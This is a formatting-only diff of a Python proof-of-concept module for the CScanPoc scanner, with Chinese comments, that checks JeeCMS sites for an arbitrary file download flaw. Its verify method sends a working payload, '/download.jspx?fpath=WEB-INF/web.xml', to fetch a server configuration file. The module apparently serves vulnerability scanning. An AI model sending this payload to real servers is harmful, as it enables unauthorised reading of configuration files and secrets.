@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'JeeCMS_0012' # 平台漏洞编号，留空
+    vuln_id = 'JeeCMS_0012'  # 平台漏洞编号，留空
     name = 'JeeCMS arbitrary file download'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         JeeCMS /download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml 任意文件下载。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'JeeCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '7255d18c-e16f-407b-9cda-959bb8331efb'
@@ -30,11 +32,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            
+
             if req.status_code == 200 and 'com.jeecms.common.web.ProcessTimeFilter' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -44,6 +46,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
